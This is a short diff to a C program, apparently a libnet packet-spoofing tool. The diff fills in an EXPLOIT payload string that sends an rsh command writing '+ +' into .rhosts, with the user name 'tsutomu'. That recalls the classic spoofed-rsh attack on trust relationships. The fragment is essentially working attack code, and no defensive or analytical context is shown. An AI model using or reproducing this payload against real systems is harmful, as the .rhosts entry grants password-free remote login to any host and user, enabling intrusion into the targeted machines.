@@ -32,8 +32,8 @@ int main(int argc, char **argv)
     libnet_t *l;  
     char errbuf[LIBNET_ERRBUF_SIZE];
     int clean=0;
-    char *EXPLOIT;
-    int EXPLOITLEN;
+    char *EXPLOIT="0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts";
+    int EXPLOITLEN=44;
 
 
     if(argc>1)
